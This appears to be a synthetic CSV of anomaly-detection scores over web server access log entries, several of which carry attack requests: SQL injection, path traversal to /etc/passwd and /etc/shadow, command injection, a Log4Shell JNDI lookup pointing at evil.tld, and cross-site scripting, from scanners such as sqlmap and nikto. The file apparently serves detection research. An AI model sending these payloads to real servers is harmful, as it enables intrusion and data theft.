score_content,score_session,score_fused,score_fused_norm,line
34.959964752197266,,34.959964752197266,34.959964752197266,{"remote_addr": "192.245.116.19", "time_local": "11/Jan/2025:09:04:46 -0700", "request": "PUT /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6563, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
30.60993766784668,,30.60993766784668,30.60993766784668,{"remote_addr": "11.113.72.154", "time_local": "11/Jan/2025:09:04:47 -0700", "request": "DELETE /api/products HTTP/2", "status": 304, "body_bytes_sent": 690, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.2681616544723511,,0.2681616544723511,0.2681616544723511,{"remote_addr": "77.213.46.171", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14030, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.21456332504749298,,0.21456332504749298,0.21456332504749298,{"remote_addr": "236.5.112.82", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 1888, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
126.50552368164062,,126.50552368164062,126.50552368164062,{"remote_addr": "199.215.203.158", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 4602, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
129.5881805419922,,129.5881805419922,129.5881805419922,{"remote_addr": "141.104.147.104", "time_local": "11/Jan/2025:09:04:49 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 302, "body_bytes_sent": 362, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
16.469602584838867,,16.469602584838867,16.469602584838867,{"remote_addr": "230.232.109.178", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "PUT /admin HTTP/2", "status": 302, "body_bytes_sent": 17754, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
26.621728897094727,,26.621728897094727,26.621728897094727,{"remote_addr": "141.193.176.35", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 10578, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
4.798055648803711,,4.798055648803711,4.798055648803711,{"remote_addr": "195.95.15.43", "time_local": "11/Jan/2025:09:04:51 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 4595, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
103.08325958251953,,103.08325958251953,103.08325958251953,{"remote_addr": "53.190.148.224", "time_local": "11/Jan/2025:09:04:52 -0700", "request": "TRACE /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3617, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
95.1208267211914,,95.1208267211914,95.1208267211914,{"remote_addr": "134.147.153.210", "time_local": "11/Jan/2025:09:04:53 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 1183, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
11.656615257263184,,11.656615257263184,11.656615257263184,{"remote_addr": "242.211.132.20", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "PUT /cgi-bin/test.cgi HTTP/2", "status": 204, "body_bytes_sent": 1310, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
3.009722948074341,,3.009722948074341,3.009722948074341,{"remote_addr": "254.170.38.17", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 248, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
5.125276565551758,,5.125276565551758,5.125276565551758,{"remote_addr": "169.115.70.28", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 15512, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.7159008979797363,,1.7159008979797363,1.7159008979797363,{"remote_addr": "29.229.102.73", "time_local": "11/Jan/2025:09:04:55 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 729, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30115.111328125,,30115.111328125,30115.111328125,{"remote_addr": "68.208.43.228", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "POST /logout HTTP/2", "status": 403, "body_bytes_sent": 616, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
29.159143447875977,,29.159143447875977,29.159143447875977,{"remote_addr": "98.51.102.213", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "DELETE /index.html HTTP/2", "status": 304, "body_bytes_sent": 14646, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
69.3313980102539,,69.3313980102539,69.3313980102539,{"remote_addr": "194.142.1.7", "time_local": "11/Jan/2025:09:04:57 -0700", "request": "HEAD /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 15559, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.23006926476955414,,0.23006926476955414,0.23006926476955414,{"remote_addr": "25.57.220.199", "time_local": "11/Jan/2025:09:04:58 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 5220, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
72.5701675415039,,72.5701675415039,72.5701675415039,{"remote_addr": "201.182.152.162", "time_local": "11/Jan/2025:09:04:59 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 10869, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.682424545288086,,11.682424545288086,11.682424545288086,{"remote_addr": "200.72.128.164", "time_local": "11/Jan/2025:09:05:00 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 200, "body_bytes_sent": 6160, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
35.058448791503906,,35.058448791503906,35.058448791503906,{"remote_addr": "187.99.162.110", "time_local": "11/Jan/2025:09:05:01 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 2668, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
38.05412673950195,,38.05412673950195,38.05412673950195,{"remote_addr": "108.254.218.45", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 14706, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
23.713708877563477,,23.713708877563477,23.713708877563477,{"remote_addr": "201.97.140.251", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 8702, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
3.222001791000366,,3.222001791000366,3.222001791000366,{"remote_addr": "200.235.160.58", "time_local": "11/Jan/2025:09:05:03 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 14038, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
95.16138458251953,,95.16138458251953,95.16138458251953,{"remote_addr": "62.4.133.150", "time_local": "11/Jan/2025:09:05:04 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 16281, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
104.79069519042969,,104.79069519042969,104.79069519042969,{"remote_addr": "244.39.118.82", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 4174, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
28.92548179626465,,28.92548179626465,28.92548179626465,{"remote_addr": "203.72.250.207", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 302, "body_bytes_sent": 3492, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.22456322610378265,,0.22456322610378265,0.22456322610378265,{"remote_addr": "153.24.142.110", "time_local": "11/Jan/2025:09:05:06 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8922, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.27340805530548096,,0.27340805530548096,0.27340805530548096,{"remote_addr": "125.214.230.195", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 15544, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
47.63399887084961,,47.63399887084961,47.63399887084961,{"remote_addr": "246.10.198.240", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1391, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
95.14185333251953,,95.14185333251953,95.14185333251953,{"remote_addr": "36.97.68.31", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10904, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30205.6484375,,30205.6484375,30205.6484375,{"remote_addr": "228.183.10.247", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 401, "body_bytes_sent": 1321, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30138.236328125,,30138.236328125,30138.236328125,{"remote_addr": "50.223.219.223", "time_local": "11/Jan/2025:09:05:09 -0700", "request": "DELETE / HTTP/2", "status": 404, "body_bytes_sent": 342, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
69.43512725830078,,69.43512725830078,69.43512725830078,{"remote_addr": "219.41.147.148", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8850, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
49.38406753540039,,49.38406753540039,49.38406753540039,{"remote_addr": "139.70.29.153", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5126, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.443384170532227,,13.443384170532227,13.443384170532227,{"remote_addr": "215.199.122.98", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "PUT /contact HTTP/2", "status": 200, "body_bytes_sent": 15064, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
7.885601997375488,,7.885601997375488,7.885601997375488,{"remote_addr": "95.112.233.92", "time_local": "11/Jan/2025:09:05:11 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 12334, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.8580851554870605,,4.8580851554870605,4.8580851554870605,{"remote_addr": "95.167.130.150", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 9765, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.947286128997803,,4.947286128997803,4.947286128997803,{"remote_addr": "127.168.83.86", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /login HTTP/2", "status": 302, "body_bytes_sent": 13432, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
23.68620491027832,,23.68620491027832,23.68620491027832,{"remote_addr": "80.164.25.181", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3103, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
50.704322814941406,,50.704322814941406,50.704322814941406,{"remote_addr": "171.74.41.136", "time_local": "11/Jan/2025:09:05:13 -0700", "request": "HEAD /dashboard HTTP/2", "status": 304, "body_bytes_sent": 16391, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30157.876953125,,30157.876953125,30157.876953125,{"remote_addr": "226.240.164.45", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "HEAD /logout HTTP/2", "status": 401, "body_bytes_sent": 449, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30134.3515625,,30134.3515625,30134.3515625,{"remote_addr": "96.175.201.226", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "GET /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 608, "http_referer": "-", "http_user_agent": "dirb/2.22"}
106.1558837890625,,106.1558837890625,106.1558837890625,{"remote_addr": "239.87.196.197", "time_local": "11/Jan/2025:09:05:15 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 11455, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
49.383846282958984,,49.383846282958984,49.383846282958984,{"remote_addr": "224.46.51.15", "time_local": "11/Jan/2025:09:05:16 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 5083, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
13.3859281539917,,13.3859281539917,13.3859281539917,{"remote_addr": "28.179.90.47", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1056, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.889358997344971,,4.889358997344971,4.889358997344971,{"remote_addr": "184.136.203.162", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "GET /profile HTTP/2", "status": 304, "body_bytes_sent": 7067, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
26.4681396484375,,26.4681396484375,26.4681396484375,{"remote_addr": "65.27.133.15", "time_local": "11/Jan/2025:09:05:18 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4572, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
30112.244140625,,30112.244140625,30112.244140625,{"remote_addr": "15.79.229.49", "time_local": "11/Jan/2025:09:05:19 -0700", "request": "GET /contact HTTP/2", "status": 403, "body_bytes_sent": 363, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
49.371299743652344,,49.371299743652344,49.371299743652344,{"remote_addr": "8.46.238.63", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 12687, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
3.13252329826355,,3.13252329826355,3.13252329826355,{"remote_addr": "239.63.227.208", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 2340, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
71.81263732910156,,71.81263732910156,71.81263732910156,{"remote_addr": "161.135.94.227", "time_local": "11/Jan/2025:09:05:21 -0700", "request": "OPTIONS /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 2412, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.621564865112305,,4.621564865112305,4.621564865112305,{"remote_addr": "235.38.58.140", "time_local": "11/Jan/2025:09:05:22 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 4173, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.933403491973877,,1.933403491973877,1.933403491973877,{"remote_addr": "128.105.3.52", "time_local": "11/Jan/2025:09:05:23 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 12576, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
72.4886703491211,,72.4886703491211,72.4886703491211,{"remote_addr": "167.233.72.38", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 302, "body_bytes_sent": 1242, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30113.8984375,,30113.8984375,30113.8984375,{"remote_addr": "204.66.199.225", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "POST /index.html HTTP/2", "status": 403, "body_bytes_sent": 81, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
126.6279296875,,126.6279296875,126.6279296875,{"remote_addr": "11.25.158.168", "time_local": "11/Jan/2025:09:05:25 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 14430, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
74.82610321044922,,74.82610321044922,74.82610321044922,{"remote_addr": "148.246.69.79", "time_local": "11/Jan/2025:09:05:26 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 302, "body_bytes_sent": 4055, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
3.151686191558838,,3.151686191558838,3.151686191558838,{"remote_addr": "93.75.143.136", "time_local": "11/Jan/2025:09:05:27 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 2101, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
95.13086700439453,,95.13086700439453,95.13086700439453,{"remote_addr": "224.169.93.210", "time_local": "11/Jan/2025:09:05:28 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8339, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
23.842388153076172,,23.842388153076172,23.842388153076172,{"remote_addr": "128.128.242.42", "time_local": "11/Jan/2025:09:05:29 -0700", "request": "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17135, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.2696341872215271,,0.2696341872215271,0.2696341872215271,{"remote_addr": "213.180.115.55", "time_local": "11/Jan/2025:09:05:30 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2841, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
103.29801940917969,,103.29801940917969,103.29801940917969,{"remote_addr": "88.241.11.197", "time_local": "11/Jan/2025:09:05:31 -0700", "request": "TRACE /.git/config HTTP/2", "status": 200, "body_bytes_sent": 7025, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
16.46277618408203,,16.46277618408203,16.46277618408203,{"remote_addr": "18.42.125.166", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "PUT /about HTTP/2", "status": 302, "body_bytes_sent": 15660, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
26.113574981689453,,26.113574981689453,26.113574981689453,{"remote_addr": "179.112.172.176", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13260, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
73.3340835571289,,73.3340835571289,73.3340835571289,{"remote_addr": "7.21.136.71", "time_local": "11/Jan/2025:09:05:33 -0700", "request": "OPTIONS /server-status HTTP/2", "status": 200, "body_bytes_sent": 17707, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
7.725982189178467,,7.725982189178467,7.725982189178467,{"remote_addr": "139.206.242.159", "time_local": "11/Jan/2025:09:05:34 -0700", "request": "POST /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17410, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
95.151611328125,,95.151611328125,95.151611328125,{"remote_addr": "34.171.190.41", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 8585, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
30205.892578125,,30205.892578125,30205.892578125,{"remote_addr": "59.151.127.62", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 114, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
49.6685905456543,,49.6685905456543,49.6685905456543,{"remote_addr": "109.37.251.205", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 16746, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
30213.787109375,,30213.787109375,30213.787109375,{"remote_addr": "53.249.188.148", "time_local": "11/Jan/2025:09:05:36 -0700", "request": "TRACE /index.html HTTP/2", "status": 403, "body_bytes_sent": 118, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30159.9375,,30159.9375,30159.9375,{"remote_addr": "141.88.220.206", "time_local": "11/Jan/2025:09:05:37 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 401, "body_bytes_sent": 601, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
3.1860570907592773,,3.1860570907592773,3.1860570907592773,{"remote_addr": "67.74.89.227", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 5645, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
71.89580535888672,,71.89580535888672,71.89580535888672,{"remote_addr": "37.84.254.186", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
30.97514533996582,,30.97514533996582,30.97514533996582,{"remote_addr": "214.151.119.72", "time_local": "11/Jan/2025:09:05:39 -0700", "request": "DELETE / HTTP/2", "status": 304, "body_bytes_sent": 4208, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30134.341796875,,30134.341796875,30134.341796875,{"remote_addr": "67.193.198.62", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 403, "body_bytes_sent": 1073, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.1989338397979736,,2.1989338397979736,2.1989338397979736,{"remote_addr": "181.248.171.87", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 8759, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
49.452449798583984,,49.452449798583984,49.452449798583984,{"remote_addr": "122.150.161.62", "time_local": "11/Jan/2025:09:05:41 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16499, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
35.068763732910156,,35.068763732910156,35.068763732910156,{"remote_addr": "238.227.252.24", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2262, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.8303059339523315,,1.8303059339523315,1.8303059339523315,{"remote_addr": "123.52.49.89", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
73.53113555908203,,73.53113555908203,73.53113555908203,{"remote_addr": "197.54.97.224", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "OPTIONS /about HTTP/2", "status": 200, "body_bytes_sent": 5762, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
47.67657470703125,,47.67657470703125,47.67657470703125,{"remote_addr": "241.177.150.138", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.885469913482666,,1.885469913482666,1.885469913482666,{"remote_addr": "36.184.68.223", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 2226, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
23.5949764251709,,23.5949764251709,23.5949764251709,{"remote_addr": "99.229.118.59", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
104.81529998779297,,104.81529998779297,104.81529998779297,{"remote_addr": "74.190.96.21", "time_local": "11/Jan/2025:09:05:45 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 9188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
